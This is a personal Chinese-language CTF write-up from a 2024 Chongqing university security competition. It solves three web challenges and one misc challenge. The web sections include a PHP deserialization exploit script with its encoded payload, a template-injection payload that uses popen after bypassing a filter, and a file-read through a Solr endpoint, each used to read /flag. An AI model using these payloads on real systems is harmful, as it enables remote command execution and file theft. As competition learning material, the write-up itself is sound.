---
title: 2024重庆市大学生信息安全竞赛个人WP
description: 本次重庆市大学生信息安全竞赛共解出4道题，总计400分，其中三道WEB，一道MISC。
date: 2024-12-9
image: cover.jpg
categories:
    - cate3
tags:
    - CTF WP
---

## WEB：

### web-Web1:

​	访问题目后，发现页面显示 nothing，扫描目录发现存在一个 www.zip 的压缩包，猜测是源码泄露。

![image-20241216162352987](/image-20241216162352987.png)

​	访问 www.zip 后获取到源码。

![image-20241216162359678](/image-20241216162359678.png)

​	审计源码后发现，在 c2VyaWFsaXpl.php 页面中存在反序列化漏洞，导致命令执行，构造利用的 PHP 脚本 。

```php
<?php 
class Flag{     public $cmd='cat /flag'; 
} 
echo urlencode(serialize(new Flag())); 
?> 
```

​	Payload:

```php
O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A9%3A%22cat+% 2Fflag%22%3B%7D 
```

​	![image-20241216162459365](/image-20241216162459365.png)

### web-Web3：

​	前端传入数据后会回显在页面上，猜测是模板注入漏洞。传入{{1+1}}发现会被拦截，猜测被证实，于是传入{%print(‘1’)%}，尝试绕过，并验证是否是 pythonweb，发现页面返回 1，则证实确实是模板注入漏洞，构造 payload: 

```python
{%print(''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('cat /flag').read())%} 
```

​	![image-20241216162612351](/image-20241216162612351.png)

### web-Web4:

​	进入后发现文件上传，但是测试发现无论上传什么文件，都会被删除，导致无法上传，扫描目录后发现存在接口：/solr/admin/file/?file=solrconfig.xml，访问后发现是文件包含，于是尝试直接包含根目录下的 flag 文件

![image-20241216162645607](/image-20241216162645607.png)

## MISC

### **Misc-**九九归一：

​	打开文件发现是一堆二位数数字，还有字母，所以猜测是 hex 编码： 

![img](/clip_image002.jpg) 

​	观察解码结果，猜测是 base64 编码： 

![img](/clip_image004.jpg) 

​	观察文件头发现 PNG 所以猜测是一个 png 图片，保存下来，同时我们往下翻，发现有多个 PNG，所以猜测是多个 PNG 合并，因此使用 foremost 分离图片。 

![img](/clip_image006.jpg) 

​	使用foremost分离出 9 个图片，合并后得到一个二维码。 

![img](/clip_image008.jpg) 

​	解码后得到 flag： 

![img](/clip_image009.jpg)